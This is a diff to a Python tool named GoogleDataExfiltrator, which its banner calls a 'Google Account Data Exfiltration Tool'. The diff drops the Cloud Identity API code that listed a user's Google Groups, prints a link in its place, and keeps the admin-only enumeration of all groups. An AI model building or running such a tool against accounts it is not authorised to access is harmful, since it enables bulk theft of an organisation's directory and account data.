@@ -31,7 +31,6 @@ SCOPES = [
     'https://www.googleapis.com/auth/admin.directory.group.readonly',
     'https://www.googleapis.com/auth/admin.directory.orgunit.readonly',
     'https://www.googleapis.com/auth/admin.directory.domain.readonly',
-    'https://www.googleapis.com/auth/cloud-identity.groups.readonly',
 ]
 
 class GoogleDataExfiltrator:
@@ -103,7 +102,6 @@ class GoogleDataExfiltrator:
             # Try to initialize admin services (will fail for non-admin users)
             try:
                 self.services['admin_directory'] = build('admin', 'directory_v1', credentials=self.creds)
-                self.services['cloudidentity'] = build('cloudidentity', 'v1', credentials=self.creds)
                 print("[+] All services initialized (including admin services)")
                 self.is_admin = True
             except Exception:
@@ -984,7 +982,7 @@ class GoogleDataExfiltrator:
         print("="*60)
     
     def exfiltrate_workspace_groups(self):
-        """Exfiltrate Google Groups membership (non-admin: user's groups only)"""
+        """Exfiltrate Google Groups membership"""
         print("\n[*] Starting Google Groups exfiltration...")
         groups_dir = self.output_dir / 'workspace_groups'
         groups_dir.mkdir(exist_ok=True)
@@ -994,33 +992,17 @@ class GoogleDataExfiltrator:
             return
         
         try:
-            # Get user's groups (works for non-admin users)
-            print("[+] Retrieving groups user belongs to...")
-            my_groups = []
-            page_token = None
+            # For regular users - provide direct link
+            print("\n" + "="*60)
+            print("Google Groups Detection")
+            print("="*60)
+            print("\nhttps://groups.google.com/my-groups")
+            print("\n" + "="*60)
             
-            # Using Cloud Identity Groups API
-            if 'cloudidentity' in self.services:
-                try:
-                    while True:
-                        results = self.services['cloudidentity'].groups().memberships().list(
-                            parent='groups/-',
-                            pageToken=page_token
-                        ).execute()
-                        
-                        memberships = results.get('memberships', [])
-                        my_groups.extend(memberships)
-                        page_token = results.get('nextPageToken')
-                        
-                        if not page_token:
-                            break
-                except Exception as e:
-                    print(f"[-] Cloud Identity API failed: {e}")
-            
-            # Try Directory API for groups (requires admin)
+            # If admin, enumerate all groups programmatically
             if self.is_admin and 'admin_directory' in self.services:
                 try:
-                    print("[+] Admin access detected - enumerating ALL groups...")
+                    print("\n[+] Admin access detected - enumerating ALL groups...")
                     all_groups = []
                     page_token = None
                     
@@ -1082,12 +1064,6 @@ class GoogleDataExfiltrator:
                     
                 except Exception as e:
                     print(f"[-] Admin Directory API failed: {e}")
-            
-            # Save user's groups
-            if my_groups:
-                with open(groups_dir / 'my_groups.json', 'w') as f:
-                    json.dump(my_groups, f, indent=2)
-                print(f"[+] Retrieved {len(my_groups)} groups user belongs to")
             
             print(f"[+] Workspace Groups exfiltration complete")
             
@@ -1554,7 +1530,7 @@ Examples:
  ──────────────────────────────────────
                                        
   Google Account Data Exfiltration Tool
-     """
+    """
     print(banner)
     
     # Set up limits
